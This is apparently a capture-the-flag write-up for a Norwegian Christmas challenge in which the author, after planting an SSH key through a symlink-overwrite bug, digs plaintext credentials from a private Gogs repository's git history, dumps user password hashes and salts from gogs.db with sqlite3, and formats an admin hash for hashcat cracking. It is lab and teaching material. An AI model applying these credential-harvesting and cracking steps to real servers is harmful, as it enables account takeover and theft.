# Luke 20 Bonus

**Description**:
>Etter å ha klart å få et fotfeste på Cybernissens hjemmeserver, trenger vi at du finner listen over alle snille og slemme spillere som har spilt. Flagget finner du i /root/root.txt.

## Access Recap

- SSH tunnel: `ssh -o ProxyCommand="openssl s_client -quiet -connect redacted.julec.tf:1337" Cyber@localhost` (`Cyber123!`).
- We already planted our key into `/home/git/.ssh/authorized_keys` via the symlink overwrite (CVE-2025-8110 style), so we can SSH as `git` with `id_rsa`:

```sh
ssh -o StrictHostKeyChecking=no \
    -o ProxyCommand="openssl s_client -quiet -connect redacted.julec.tf:1337" \
    -i id_rsa git@localhost
```

## Steps to Find Cred Material

1) List repos on disk as `git`:
   - Path: `/data/git/gogs-repositories`
   - Found private repo: `/data/git/gogs-repositories/cyberlandslagnissen/gjemt.git`

2) Inspect `gjemt.git`:

   ```bash
   git show-ref          # shows main at 3595f04a...
   git log --stat main
   git show 3595f04a...:passord.txt      # VimCrypt ciphertext (new password)
   git show 754ac50d...:passord.txt      # Plaintext credentials
   ```

   - Plaintext (first commit): `Cyberlandslagnissen:Rendition2-Ogle-Refrain-Chemist`
   - Latest commit encrypted the password (VimCrypt~02).

3) Locate Gogs database:
   - `find / -name gogs.db 2>/dev/null` → `/data/gogs/data/gogs.db`

4) Dump user table structure (to get column names):

   ```bash
   sqlite3 /data/gogs/data/gogs.db "pragma table_info(user);"
   ```

   Columns: `name`, `passwd`, `salt`, `is_admin`, etc.

5) Extract hashes and salts:

   ```bash
   sqlite3 /data/gogs/data/gogs.db "select name,is_admin,passwd,salt from user;"
   ```

   Results:
   - `Cyberlandslagnissen` (is_admin=1):
     - salt: `nBiFIYAU2L`
     - hash: `ec55c2f083b287589fa9788a7adffe07bb49d8b83c441bb88cc6787ba9ea91c02069341bc3f957af72bf84174062d8733a55`
   - `hacker` (is_admin=0):
     - salt: `O38j8kMRsb`
     - hash: `6bc52d171c0d7df8aa50922ab8a9665e5cef060ad55ebe9e88bd807c2086662921e42936fbd3f2082ab1fd3cceaaa514d173`

6) Hash format (Gogs default):
   - PBKDF2-HMAC-SHA256, 10k iterations, 50-byte derived key.
   - Hashcat format (mode 10900):

     ```txt
     $pbkdf2-sha256$10000$nBiFIYAU2L$ec55c2f083b287589fa9788a7adffe07bb49d8b83c441bb88cc6787ba9ea91c02069341bc3f957af72bf84174062d8733a55
     ```
